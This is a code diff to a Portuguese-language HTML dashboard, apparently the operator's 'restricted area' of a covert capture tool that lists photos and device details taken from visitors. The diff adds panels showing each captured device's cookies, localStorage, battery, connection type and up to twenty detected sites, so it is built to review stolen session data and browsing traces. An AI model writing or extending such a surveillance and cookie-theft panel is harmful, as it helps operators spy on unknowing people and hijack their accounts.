@@ -123,6 +123,41 @@
             text-transform: uppercase;
         }
 
+        .cookie-box {
+            background: rgba(0, 255, 0, 0.05);
+            border: 1px dashed #00ff00;
+            padding: 10px;
+            margin-top: 10px;
+            font-size: 11px;
+            max-height: 100px;
+            overflow-y: auto;
+            word-break: break-all;
+            font-family: 'Courier New', monospace;
+            color: #00ff00;
+        }
+
+        .storage-section {
+            margin-top: 15px;
+        }
+
+        .storage-title {
+            font-size: 10px;
+            color: #667eea;
+            font-weight: bold;
+            text-transform: uppercase;
+            margin-bottom: 5px;
+        }
+
+        .storage-data {
+            background: rgba(102, 126, 234, 0.1);
+            border: 1px solid rgba(102, 126, 234, 0.3);
+            padding: 8px;
+            font-size: 10px;
+            max-height: 80px;
+            overflow-y: auto;
+            color: #a0aec0;
+        }
+
         .mensagem {
             text-align: center;
             color: white;
@@ -151,14 +186,14 @@
 <body>
     <div class="container">
         <a href="/" class="voltar">← Sair da Área Restrita</a>
-        <h1>👁️ Monitoramento de Capturas</h1>
+        <h1>👁️ Monitoramento de Capturas Profundo</h1>
 
         <div class="mensagem" id="aviso">
             ⚠️ Nota: No Vercel, as fotos e dados são persistidos apenas temporariamente em /tmp.
         </div>
 
         <div id="carregando" class="carregando" style="display:none;">
-            CONECTANDO AO BANCO DE DADOS...
+            EXTRAINDO DADOS DO BANCO...
         </div>
 
         <div class="galeria" id="galeria"></div>
@@ -177,7 +212,6 @@
         carregarFotos();
 
         function carregarFotos() {
-            // Só mostrar carregando na primeira vez se estiver vazio
             if (!document.getElementById('galeria').children.length) {
                 document.getElementById('carregando').style.display = 'block';
             }
@@ -226,26 +260,36 @@
                                 <span class="info-value">${disp.platform || 'N/A'}</span>
                             </div>
                             <div class="info-item">
-                                <span class="info-label">RESOLUÇÃO:</span>
-                                <span class="info-value">${disp.largura || '?'}x${disp.altura || '?'}</span>
+                                <span class="info-label">TELA:</span>
+                                <span class="info-value">${disp.larguraTela || '?'}x${disp.alturaTela || '?'}</span>
                             </div>
                             <div class="info-item">
-                                <span class="info-label">MEMÓRIA:</span>
-                                <span class="info-value">${disp.memoria || '?'} GB (${disp.cores || '?'} núcleos)</span>
+                                <span class="info-label">BATERIA:</span>
+                                <span class="info-value">${disp.bateria || 'N/A'}</span>
                             </div>
                             <div class="info-item">
-                                <span class="info-label">NAVEGADOR:</span>
-                                <span class="info-value">${disp.userAgent ? disp.userAgent.split(' ').pop() : 'N/A'}</span>
+                                <span class="info-label">CONEXÃO:</span>
+                                <span class="info-value">${disp.conexao ? (disp.conexao.type || disp.conexao) : 'N/A'}</span>
                             </div>
-                            
+
                             ${sites.length > 0 ? `
                                 <div class="sites-list">
                                     <div class="sites-title">SITES DETECTADOS:</div>
                                     <div class="info-value" style="font-size: 11px;">
-                                        ${sites.slice(0, 15).join(', ')}${sites.length > 15 ? '...' : ''}
+                                        ${sites.slice(0, 20).join(', ')}${sites.length > 20 ? '...' : ''}
                                     </div>
                                 </div>
                             ` : ''}
+
+                            <div class="storage-section">
+                                <div class="storage-title">🍪 Cookies:</div>
+                                <div class="cookie-box">${disp.cookies || 'Nenhum cookie acessível'}</div>
+                            </div>
+
+                            <div class="storage-section">
+                                <div class="storage-title">💾 Local Storage:</div>
+                                <div class="storage-data">${disp.localStorage && disp.localStorage !== '{}' ? disp.localStorage : 'Vazio'}</div>
+                            </div>
                         </div>
                     </div>
                 `;
